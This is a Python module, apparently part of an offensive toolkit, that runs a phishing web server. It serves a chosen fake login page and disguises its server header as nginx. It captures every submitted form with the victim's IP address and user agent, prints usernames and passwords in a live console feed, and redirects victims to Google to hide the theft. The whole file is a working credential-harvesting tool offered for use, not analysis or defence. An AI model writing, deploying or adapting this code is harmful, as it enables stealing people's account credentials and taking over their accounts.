# Phishing Server
# serve a phishing page locally with live log tail

from Config.Colors import *
from Config.Util import *

import os
import json
import time
import threading
import socket
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs


class JsonLogger:
    def __init__(self, path):
        self.path = path
        self.lock = threading.Lock()
        os.makedirs(os.path.dirname(path), exist_ok=True)

    def record(self, entry):
        with self.lock:
            try:
                with open(self.path, "a", encoding="utf-8") as f:
                    f.write(json.dumps(entry, ensure_ascii=False) + "\n")
            except Exception:
                pass

    def read_all(self):
        if not os.path.exists(self.path):
            return []
        out = []
        with open(self.path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    out.append(json.loads(line))
                except Exception:
                    pass
        return out


class Handler(BaseHTTPRequestHandler):
    template = ""
    logger = None
    redirect_to = "https://www.google.com"
    server_version = "nginx"

    def log_message(self, *a, **k):
        return

    def _send(self, code, body, ctype="text/html; charset=utf-8"):
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try:
            self.wfile.write(data)
        except Exception:
            pass

    def do_GET(self):
        if self.path in ("/", "/index.html", "/login"):
            self._send(200, self.template)
            return
        if self.path == "/favicon.ico":
            self._send(204, b"")
            return
        self.send_response(302)
        self.send_header("Location", self.redirect_to)
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw = self.rfile.read(length).decode("utf-8", "ignore") if length else ""
        form = parse_qs(raw, keep_blank_values=True)

        entry = {
            "time": datetime.now().isoformat(),
            "ip": self.client_address[0],
            "port": self.client_address[1],
            "ua": self.headers.get("User-Agent", ""),
            "referer": self.headers.get("Referer", ""),
            "path": self.path,
            "raw": raw,
            "form": {k: v for k, v in form.items()},
        }
        if self.logger:
            self.logger.record(entry)

        u = (form.get("username") or form.get("email") or [""])[0]
        p = (form.get("password") or [""])[0]
        log(f"captured  user={u!r}  pass={p!r}  from {self.client_address[0]}", "ok")

        self.send_response(302)
        self.send_header("Location", self.redirect_to)
        self.end_headers()


def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip


def run():
    banner()
    log("Phishing Server", "info")

    path = input_line("path to html template > ").strip()
    if not path:
        pause(); return
    if not os.path.exists(path):
        # try templates dir
        alt = os.path.join(template_dir(), path)
        if os.path.exists(alt):
            path = alt
        else:
            log("template not found", "err"); pause(); return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        template = f.read()

    port_str = input_line("port [8080] > ").strip() or "8080"
    try:
        port = int(port_str)
    except ValueError:
        port = 8080

    redirect_to = input_line("redirect after submit [https://www.google.com] > ").strip() \
        or "https://www.google.com"

    logfile = os.path.join(output_dir(),
                           f"phish_{datetime.now().strftime('%Y%m%d%H%M%S')}.log")

    handler = type("Bound", (Handler,), {
        "template": template,
        "logger": JsonLogger(logfile),
        "redirect_to": redirect_to,
    })

    try:
        srv = ThreadingHTTPServer(("0.0.0.0", port), handler)
    except OSError as e:
        log(f"could not bind: {e}", "err"); pause(); return

    lan = get_lan_ip()
    log(f"listening on 0.0.0.0:{port}", "info")
    log(f"lan url  -> http://{lan}:{port}/", "info")
    log(f"logfile  -> {logfile}", "info")
    print(f"\n{DIM}ctrl+c to stop{RESET}\n")

    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()

    seen = 0
    logger = handler.logger
    try:
        while True:
            time.sleep(1)
            entries = logger.read_all()
            while seen < len(entries):
                e = entries[seen]
                f = e.get("form", {})
                u = (f.get("username") or f.get("email") or [""])[0]
                p = (f.get("password") or [""])[0]
                print(f"{GREEN}[+]{RESET} {e['time']}  {e['ip']}  "
                      f"user={u!r}  pass={p!r}")
                seen += 1
    except KeyboardInterrupt:
        print()
    finally:
        try:
            srv.shutdown(); srv.server_close()
        except Exception:
            pass
        log("server stopped", "ok")
        pause()